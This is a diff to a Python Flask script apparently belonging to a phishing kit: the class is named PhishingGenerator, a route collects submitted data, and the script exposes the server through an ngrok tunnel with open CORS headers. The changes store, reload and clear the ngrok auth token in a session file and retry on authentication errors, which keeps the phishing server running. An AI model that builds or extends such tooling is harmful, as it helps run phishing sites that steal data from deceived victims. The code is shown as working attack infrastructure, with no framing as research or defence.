@@ -1,4 +1,5 @@
 import base64
+import json
 import os
 import random
 import string
@@ -10,7 +11,7 @@ import logging
 from flask import Flask, request, redirect, jsonify, make_response
 import pyshorteners
 from urllib.parse import urlparse, urljoin
-from pyngrok import ngrok, conf
+from pyngrok import ngrok, conf, exception as ngrok_exception
 from rich.console import Console
 from rich.table import Table
 from rich.live import Live
@@ -19,10 +20,10 @@ from rich.progress import Progress
 import jwt
 from bs4 import BeautifulSoup
 
-# Inisialisasi console
+SESSION_FILE = '.phishgen_session.json'
+
 console = Console()
 
-# Nonaktifkan log ngrok dan Flask
 logging.getLogger("pyngrok").setLevel(logging.ERROR)
 logging.getLogger("werkzeug").setLevel(logging.ERROR)
 
@@ -366,6 +367,39 @@ class PhishingGenerator:
                 self.logger.error(f"Error collecting data: {str(e)}")
                 return jsonify({'status': 'error', 'message': str(e)}), 500
 
+    def _load_session_token(self):
+        if os.path.exists(SESSION_FILE):
+            try:
+                with open(SESSION_FILE, 'r') as f:
+                    session = json.load(f)
+                    return session.get('ngrok_token')
+            except:
+                pass
+        return None
+
+    def _save_session_token(self, token):
+        session = {}
+        if os.path.exists(SESSION_FILE):
+            try:
+                with open(SESSION_FILE, 'r') as f:
+                    session = json.load(f)
+            except:
+                pass
+        session['ngrok_token'] = token
+        with open(SESSION_FILE, 'w') as f:
+            json.dump(session, f)
+
+    def _clear_session_token(self):
+        if os.path.exists(SESSION_FILE):
+            try:
+                with open(SESSION_FILE, 'r') as f:
+                    session = json.load(f)
+                session.pop('ngrok_token', None)
+                with open(SESSION_FILE, 'w') as f:
+                    json.dump(session, f)
+            except:
+                pass
+
     def save_result(self, result):
         """Simpan hasil dengan penanganan kesalahan"""
         try:
@@ -403,24 +437,26 @@ class PhishingGenerator:
             console.print("[red]Invalid choice! Please select 1 or 2[/]")
 
     def setup_ngrok(self):
-        """Setup ngrok tunnel dengan penanganan error yang lebih baik"""
+        """Setup ngrok tunnel dengan session token"""
         self.clear_screen()
         try:
-            # Konfigurasi ngrok
-            if not self.ngrok_auth_token:
-                self.ngrok_auth_token = console.input("\n[yellow][[?]] Enter ngrok auth token: [/]")
-                conf.get_default().auth_token = self.ngrok_auth_token
+            saved_token = self._load_session_token()
+            if saved_token:
+                self.ngrok_auth_token = saved_token
+                console.print("[green]✓ Ngrok token loaded from session[/]")
             else:
-                conf.get_default().auth_token = self.ngrok_auth_token
-            conf.get_default().region = "ap" # Asia Pacific
-            
-            # Tutup tunnel yang ada
+                self.ngrok_auth_token = console.input("\n[yellow][[?]] Enter your ngrok auth token (get it at https://dashboard.ngrok.com): [/]")
+                self._save_session_token(self.ngrok_auth_token)
+                console.print("[green]✓ Ngrok token saved to session[/]")
+
+            conf.get_default().auth_token = self.ngrok_auth_token
+            conf.get_default().region = "ap"
+
             try:
                 ngrok.kill()
             except:
                 pass
-            
-            # Buat tunnel baru dengan opsi yang lebih stabil
+
             tunnel_options = {
                 "bind_tls": True,
                 "proto": "http",
@@ -429,20 +465,26 @@ class PhishingGenerator:
                 "auth": None,
                 "host_header": "rewrite"
             }
-            
-            # Coba beberapa kali jika gagal
+
             max_retries = 3
             for attempt in range(max_retries):
                 try:
                     ngrok_tunnel = ngrok.connect(**tunnel_options)
                     self.server_url = ngrok_tunnel.public_url
                     break
+                except ngrok_exception.PyngrokNgrokError as e:
+                    error_str = str(e).lower()
+                    if 'auth' in error_str or 'credential' in error_str or 'token' in error_str or 'unauthorized' in error_str:
+                        self._clear_session_token()
+                        raise Exception("Ngrok authentication failed. Token saved in session has been cleared. Please provide a valid token next run.")
+                    if attempt == max_retries - 1:
+                        raise e
+                    time.sleep(2)
                 except Exception as e:
                     if attempt == max_retries - 1:
                         raise e
                     time.sleep(2)
-            
-            # Tambahkan header untuk menghindari masalah CORS dan kompatibilitas
+
             @self.app.after_request
             def after_request(response):
                 response.headers.add('Access-Control-Allow-Origin', '*')
@@ -452,11 +494,11 @@ class PhishingGenerator:
                 response.headers.add('X-Content-Type-Options', 'nosniff')
                 response.headers.add('Strict-Transport-Security', 'max-age=31536000')
                 return response
-            
+
             msg = f"✅ Ngrok tunnel berhasil dibuat di {self.server_url}"
             self.logger.info(msg)
             console.print(f"[green]{msg}[/]")
-            
+
         except Exception as e:
             msg = f"❌ Gagal membuat tunnel ngrok: {str(e)}"
             self.logger.error(msg)
